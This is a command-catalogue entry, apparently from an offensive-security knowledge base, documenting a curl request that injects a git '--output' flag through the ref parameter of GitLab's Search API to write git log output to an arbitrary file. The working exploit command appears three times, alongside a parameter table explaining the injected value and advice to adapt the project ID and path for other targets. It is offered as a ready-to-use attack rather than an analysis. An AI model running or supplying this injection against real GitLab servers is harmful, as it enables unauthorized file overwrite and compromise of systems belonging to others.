---
id: cmd-uuid-1
data: >-
  curl --header "PRIVATE-TOKEN: $TOKEN"
  'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'
tags:
  - injection
  - api
type: command
output: 'HTTP response (possibly empty JSON), triggers file write'
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:15.338Z'
verified: false
validated: true
submitted: true
---
# curl-gitlab-search-wiki-injection

## Command

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'
```

## Description

Injects a git flag into GitLab's Search API to redirect git log output to /tmp/file, demonstrating command injection for file overwrite.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --header "PRIVATE-TOKEN: $TOKEN" | Authenticates the API call | Yes |
| scope=wiki_blobs | Specifies wiki blobs search | Yes |
| search=page | Search term matching wiki page | Yes |
| ref=--output=/tmp/file | Injected git flag for redirection | Yes |

## Examples

### Basic Usage

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'
```

### Advanced Usage

Adapt project ID and path for different targets.

## Expected Output

API returns search results (may be empty due to injection), but internally writes commit log to /tmp/file.

## Related

- [[Related Procedure: Exploit-Search-API-Command-Injection]]
